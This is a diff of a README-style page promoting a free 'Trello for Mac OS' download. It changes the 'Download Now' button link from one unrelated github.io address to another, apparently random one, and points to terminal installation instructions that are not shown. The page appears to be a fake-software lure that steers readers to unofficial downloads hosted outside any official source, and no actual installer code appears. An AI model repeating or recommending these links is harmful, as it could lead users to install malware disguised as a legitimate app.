@@ -3,7 +3,7 @@
 
 Effortlessly manage your projects with Trello for Mac OS. Follow the simple steps below to download and install this powerful task management tool for free!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/trellomac)
+[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/trellomac)
 
 If the button above doesn't work, follow the terminal command instructions below for a seamless installation.
 
